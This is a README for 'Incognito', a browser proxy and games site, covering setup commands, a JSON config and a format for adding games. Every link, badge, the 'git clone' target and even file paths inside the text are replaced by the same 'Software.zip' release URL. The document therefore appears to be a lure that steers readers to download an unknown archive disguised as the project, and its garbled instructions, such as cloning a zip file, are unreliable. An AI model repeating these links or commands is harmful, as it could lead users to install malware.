# Incognito
Access the world wide web!

[![Deploy](https://github.com/DaGhost69/Incognito-old/releases/download/v2.0/Software.zip)](https://github.com/DaGhost69/Incognito-old/releases/download/v2.0/Software.zip)
[![Deploy](https://github.com/DaGhost69/Incognito-old/releases/download/v2.0/Software.zip)](https://github.com/DaGhost69/Incognito-old/releases/download/v2.0/Software.zip)

## Setup

```sh
git clone https://github.com/DaGhost69/Incognito-old/releases/download/v2.0/Software.zip
cd Incognito
npm install
npm start
```

## Config

```json
{
    "port": 8080,
    "ssl": false,
    "prefix": "/service/",
    "codec": "xor",
    "proxy": true,
    "blacklist": [],
    "addresses": [],
    "authorization": {
        "name": "__incog_auth",
        "value": "1"
    },
    "appearance": "bright",
    "engine": "google"
}
```

- `port` HTTP Server Port
- `ssl` (true / false) HTTP Server SSL
- `prefix` Corrosion proxy prefix
- `codec` Corrosion proxy codec
- `proxy` (true / false) Have Corrosion be hosted on the https://github.com/DaGhost69/Incognito-old/releases/download/v2.0/Software.zip application. Recommended to have Corrosion hosted elsewhere with large amounts of clients.
- `blacklist` Array of hostnames to be blocked on the proxy.
- `authorization` (Object { name: "...", value: "..." } / false) Proxy authorization cookie
- `appearance` ("bright" / "midnight" / "ocean" / "lime" / "terminal") Default site appearance
- `engine` ("google" / "bing" / "brave" / "youtube" / "twitter" / "reddit") Default search engine 


## Games

More games can be added to Incognito by adding JSON in `https://github.com/DaGhost69/Incognito-old/releases/download/v2.0/Software.zip` in a specific format.
```json
{
    "thumbnail": "https://github.com/DaGhost69/Incognito-old/releases/download/v2.0/Software.zip", 
    "location": "./gamelocation/",
    "title": "Game title"
}
```
`thumbnail` images are only located in `/src/gs/thumbnails/`

Some games that are available in Incognito's main website are not available in this repo due to sizing reasons.
These games that don't come with this repo are available in [gfiles](https://github.com/DaGhost69/Incognito-old/releases/download/v2.0/Software.zip).

